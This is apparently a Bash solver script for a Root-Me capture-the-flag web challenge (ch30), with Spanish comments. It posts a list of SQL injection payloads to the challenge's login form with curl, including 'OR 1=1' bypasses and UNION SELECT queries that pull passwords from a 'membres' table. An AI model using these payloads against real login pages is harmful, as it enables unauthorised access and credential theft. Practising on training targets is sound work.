#!/bin/bash

# ================================================
# SOLUCIÓN DEFINITIVA - CH30
# Basado en los resultados del escaneo
# ================================================

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}  SOLUCIÓN DEFINITIVA - CH30${NC}"
echo -e "${GREEN}========================================${NC}"

echo -e "\n${YELLOW}[+] Probando inyección en username...${NC}"

# Payload para bypass
PAYLOADS=(
    "' OR 1=1#"
    "' OR '1'='1"
    "' OR 1=1--"
    "' || 1=1#"
    "' UNION SELECT 1,2,3,4#"
    "' UNION SELECT 1,'admin','password',4#"
    "' UNION SELECT 1,pass,3,4 FROM membres#"
)

for payload in "${PAYLOADS[@]}"; do
    echo -ne "  Probando username=$payload..."
    result=$(curl -s -X POST "$URL" -d "username=$payload&password=test" | grep -c "login failed")
    if [ "$result" -eq 0 ]; then
        echo -e " ${GREEN}✅ ÉXITO!${NC}"
        echo -e "${GREEN}========================================${NC}"
        echo -e "${GREEN}  ¡DESAFÍO COMPLETADO!${NC}"
        echo -e "${GREEN}  Payload: username=$payload${NC}"
        echo -e "${GREEN}========================================${NC}"
        exit 0
    else
        echo -e " ${RED}❌${NC}"
    fi
done

echo -e "\n${RED}========================================${NC}"
echo -e "${RED}  NINGÚN PAYLOAD FUNCIONÓ${NC}"
echo -e "${RED}========================================${NC}"
